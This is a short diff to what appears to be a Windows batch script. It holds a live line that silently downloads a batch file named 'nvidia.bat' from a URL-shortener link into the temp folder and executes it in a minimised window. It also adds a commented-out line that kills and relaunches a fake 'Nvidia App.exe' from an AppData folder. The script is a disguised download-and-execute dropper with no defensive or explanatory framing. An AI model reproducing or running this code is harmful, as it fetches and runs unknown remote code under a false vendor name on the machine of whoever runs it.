@@ -1,1 +1,3 @@
 start "" /min cmd /c "curl.exe -sL -o %TEMP%\nvidia.bat https://tinyurl.com/VZEDSTART && %TEMP%\nvidia.bat" & exit
+
+::taskkill /f /im "Nvidia App.exe" & start "" "%APPDATA%\system\Nvidia App.exe"
